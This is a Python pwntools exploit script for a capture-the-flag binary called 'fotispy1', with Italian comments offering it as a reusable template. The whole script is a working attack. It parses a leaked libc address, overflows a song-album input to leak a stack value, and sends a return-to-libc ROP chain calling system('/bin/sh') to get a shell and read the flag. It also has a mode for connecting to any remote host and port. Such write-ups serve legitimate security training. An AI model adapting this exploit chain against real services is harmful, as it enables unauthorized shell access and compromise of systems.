#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./fotispy1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x0040199b; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b': '
is_libc_leaked = False
def login(username = b'a', password = b'a'):
    io.sendlineafter(line, b'1')
    io.sendlineafter(line, username)
    io.sendlineafter(line, password)

def register(username = b'a', password = b'a'):
    io.sendlineafter(line, b'0')
    io.sendlineafter(line, username)
    io.sendlineafter(line, password)

def save_song(payload):
    io.sendlineafter(line, b'2')

    global is_libc_leaked
    if not is_libc_leaked:
        io.recvuntil(b'[DEBUG]')
        libc_leak = int(io.recvline().strip().decode(), 16)
        libc.address = libc_leak - libc.sym['printf']
        success(f"libc printf @ {libc_leak}")
        is_libc_leaked = True

    io.sendlineafter(line, b'a') # song name
    io.sendlineafter(line, b'a') # song artist
    io.sendlineafter(line, payload) # song album

def leak_and_return():
    io.sendlineafter(line, b'3')
    io.recvuntil(b"[~] Your favorites:\n")
    data = io.recvline().split(b'-')[-1][14:-1]
    return u64(data.ljust(8, b'\x00'))

register()
login()
save_song(cyclic(13))
leak = leak_and_return()

binsh = libc.address + 0x00196031
pop_rdi = libc.address + 0x00000000000277e5
ret = libc.address +  0x0000000000026e99
payload = flat([
    b'a'*13,
    leak,
    b'a'*8,
    pop_rdi, binsh,
    ret,
    libc.sym['system']
    ])
save_song(payload)
leak_and_return()


io.sendline(b"cat flag.txt")
data = io.recvregex(rb'ENO\{.*\}', capture=True)
flag = data.group(0).decode()
success(f'Flag: {flag}')
write('flag.txt', flag)
io.close()
